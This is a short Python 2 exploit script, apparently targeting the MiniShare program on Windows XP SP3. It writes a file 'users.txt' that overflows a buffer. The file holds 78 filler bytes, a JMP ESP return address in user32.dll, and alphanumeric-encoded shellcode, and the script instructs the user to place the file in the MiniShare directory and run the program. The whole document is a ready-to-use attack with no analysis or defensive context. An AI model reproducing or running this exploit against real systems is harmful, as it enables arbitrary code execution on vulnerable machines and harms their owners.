shellcode = (
"TYVTX10X41PZ41H4A4H1TA91TAFVTZ32PZNBFZDQE02D"
"QF0D13DJE1F4847029R9VNN0D668M194A0I5G5L2G3W3"
"M3Z19LN2A2Z1G0N2K0N4YK0JO9L9Q1S36403F0G3V2K1"
"Q9S123I1Y3N9R8M4E0G"
)
 
# 78 bytes till EIP
# 82 bytes till ESP
# 304 for payload
# EIP OVERWRITE
buff = "A" * 78
buff += "\x4b\x49\x48\x7e" #7E48494B JMP ESP in user32.dll win xp sp3
buff += shellcode
 
try:
    f = open("users.txt",'w')
    f.write(buff)
    f.close()
    print "[+] Vulnerable file created!  Place the 'users.txt' file in the Minishare directory and run the program...\n"
except:
    print "[-] Error occured!"